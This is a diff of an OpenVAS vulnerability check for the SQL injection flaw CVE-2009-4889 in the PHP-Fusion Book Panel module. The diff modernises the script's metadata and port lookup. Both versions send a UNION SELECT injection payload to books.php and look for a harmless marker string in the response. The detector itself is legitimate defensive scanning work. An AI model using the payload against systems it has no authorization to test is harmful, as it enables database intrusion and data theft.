@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: PHPFusion_book_panel_module_sql_injection.nasl 5016 2017-01-17 09:06:21Z teissa $
+# $Id: PHPFusion_book_panel_module_sql_injection.nasl 5668 2017-03-21 14:16:34Z cfi $
 #
 # PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability
 #
@@ -24,63 +24,60 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "The Book Panel module for PHP-Fusion is prone to an SQL-injection
-  vulnerability because it fails to sufficiently sanitize
-  user-supplied data before using it in an SQL query.
+CPE = "cpe:/a:php-fusion:php-fusion";
 
-  Exploiting this issue could allow an attacker to compromise the
-  application, access or modify data, or exploit latent
-  vulnerabilities in the underlying database.";
-
-
-if (description)
+if(description)
 {
- script_id(100043);
- script_version("$Revision: 5016 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-17 10:06:21 +0100 (Tue, 17 Jan 2017) $");
- script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
- script_bugtraq_id(34049);
- script_cve_id("CVE-2009-4889");
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.100043");
+  script_version("$Revision: 5668 $");
+  script_tag(name:"last_modification", value:"$Date: 2017-03-21 15:16:34 +0100 (Tue, 21 Mar 2017) $");
+  script_tag(name:"creation_date", value:"2009-03-13 06:42:27 +0100 (Fri, 13 Mar 2009)");
+  script_bugtraq_id(34049);
+  script_cve_id("CVE-2009-4889");
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
+  script_dependencies("secpod_php_fusion_detect.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("php-fusion/installed");
 
- script_name("PHP-Fusion Book Panel Module 'books.php' SQL Injection Vulnerability");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34049");
 
+  tag_summary = "The Book Panel module for PHP-Fusion is prone to an SQL-injection
+  vulnerability because it fails to sufficiently sanitize
+  user-supplied data before using it in an SQL query.";
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl", "http_version.nasl");
- script_require_ports("Services/www", 80);
- script_exclude_keys("Settings/disable_cgi_scanning");
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/34049");
- exit(0);
+  tag_impact = "Exploiting this issue could allow an attacker to compromise the
+  application, access or modify data, or exploit latent vulnerabilities in the underlying database.";
+
+  script_tag(name:"summary", value:tag_summary);
+  script_tag(name:"impact", value:tag_impact);
+
+  script_tag(name:"qod_type", value:"remote_app");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-port = get_http_port(default:80);
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
 
-if(!get_port_state(port))exit(0);
-if(!can_host_php(port:port))exit(0);
+if( dir == "/" ) dir = "";
 
-dir = make_list("/infusions", cgi_dirs());
-foreach d (dir)
-{ 
- url = string(d, "/book_panel/books.php?&bookid=-1+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6--");
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
- if( buf == NULL )continue;
+url = dir + "/book_panel/books.php?&bookid=-1+union+select+1,2,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,4,5,6--";
+req = http_get( item:url, port:port );
+buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
 
- if( 
-     egrep(pattern: "OpenVAS-SQL-Injection-Test", string: buf)
-   )
-   {    
-    security_message(port:port);
-    exit(0);
-   }
+if( "OpenVAS-SQL-Injection-Test" >< buf ) {    
+  report = report_vuln_url( port:port, url:url );
+  security_message( port:port, data:report );
+  exit( 0 );
 }
-exit(0);
+
+exit( 99 );
